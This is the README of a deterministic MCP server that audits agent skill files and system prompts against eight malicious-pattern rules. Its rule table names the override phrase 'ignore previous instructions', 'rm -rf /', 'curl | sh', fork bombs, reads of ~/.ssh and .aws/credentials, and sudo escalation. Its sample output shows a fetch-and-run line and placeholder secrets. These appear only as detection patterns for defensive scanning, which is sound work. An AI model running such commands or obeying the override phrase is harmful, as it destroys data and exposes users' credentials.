# mcp-skill-sec

A Model Context Protocol (MCP) server that audits any agent skill, system
prompt, or downloaded file collection against the **8 malicious-skill
supply-chain patterns**.

Deterministic, no LLM, no network calls — a self-hostable pre-install scanner
that works with Claude Code, Cursor, Copilot, OpenClaw, Codex CLI, and any
MCP-compatible agent.

## What it scans for (rules R1–R8)

| Rule | Pattern |
|------|---------|
| R1 | Prompt injection / instruction hijack (`ignore previous instructions`, secrecy directives, identity overrides) |
| R2 | Data exfiltration intent (send/post/email contents to a URL, log theft) |
| R3 | Hardcoded secrets / credentials (API keys, PATs, private keys, connection strings) |
| R4 | Dangerous commands (`rm -rf /`, `curl \| sh`, fork bombs, raw device writes) |
| R5 | Obfuscation / hidden behavior (base64-exec, eval/exec, zero-width chars) |
| R6 | Untrusted external fetches (fetch-and-run, non-PyPI installs) |
| R7 | Credential access (reading `~/.ssh`, `.aws/credentials`, `.env`) |
| R8 | Privilege escalation (`sudo -s`, setuid, adding to sudo group) |

Each finding carries a `severity` (critical/high/medium/low), a line number,
and the matching evidence line. The overall verdict is **PASS** only when
there are no critical/high findings and every medium finding is benign.

## Tools

- `audit_text(text, filename)` — audit a string (a skill you were pasted, a
  system prompt you didn't write).
- `audit_skill_file(path)` — audit a `SKILL.md` / `AGENTS.md` / `CLAUDE.md`
  on disk, line-numbered evidence.
- `audit_directory(path, pattern)` — audit a whole downloaded skills
  collection; returns per-file verdicts + a summary.
- `rule_list()` — dump the rule catalog.

## Install & run

**One command (recommended) — installs from the repo, no PyPI token needed:**

```bash
uv tool install git+https://github.com/sudo-ai-git/mcp-skill-sec
# then register with your agent:
mcp-skill-sec                       # run stdio server
mcp-skill-sec --http --port 8137    # or Streamable HTTP for remote use
```

Or with `pipx`: `pipx install git+https://github.com/sudo-ai-git/mcp-skill-sec`

**Direct from source (fallback):**

```bash
pip install mcp
python3 mcp_server.py               # run stdio
mcp install mcp_server.py --name skill-sec   # register with Claude Desktop
```

### Claude Desktop / agent config

```json
{
  "mcpServers": {
    "skill-sec": {
      "command": "mcp-skill-sec",
      "args": []
    }
  }
}
```
   
## Example

```text
skill-sec: /tmp/downloaded-skill/SKILL.md
  verdict : FLAG
  counts  : critical 1, high 2, medium 1, low 0
  R3 [critical] line 11: api_key = "sk-live-…"
  R3 [high]     line 14: password = "hunter2"
  R4 [critical] line 22: curl https://x/y.sh | sh
  action : remove the literal secrets, drop the fetch-and-run, re-audit
```

## Part of a family

This is one of three **deterministic, no-LLM** agent-trust MCP servers by `sudo-ai-git`:

- [`mcp-skill-sec`](https://github.com/sudo-ai-git/mcp-skill-sec) — pre-install skill/security audit (this repo)
- [`mcp-verify-claim`](https://github.com/sudo-ai-git/mcp-verify-claim) — evidence-gated, honestly-tiered claim reporting
- [`mcp-benchmark-hygiene`](https://github.com/sudo-ai-git/mcp-benchmark-hygiene) — pytest config-leakage / eval-honesty detection

## License & provenance

MIT. Written by `sudo-ai-git`. This is a standalone security/verification
tool; it encodes no proprietary method. It is the MCP expression of the
`skill-sec` agent skill (same rules, callable as a server instead of a skill).

## Official MCP Registry metadata

mcp-name: io.github.sudo-ai-git/mcp-skill-sec

## Hire a custom integration

Need this connected to *your* internal system (auth, logging, security-scan pass, hosted)? Open a [custom-build request](https://github.com/sudo-ai-git/agensi-builds/issues/new?template=custom-build-request.yml). MIT reference assets are free to use either way.

[![mcp-skill-sec MCP server](https://glama.ai/mcp/servers/sudo-ai-git/mcp-skill-sec/badges/score.svg)](https://glama.ai/mcp/servers/sudo-ai-git/mcp-skill-sec)
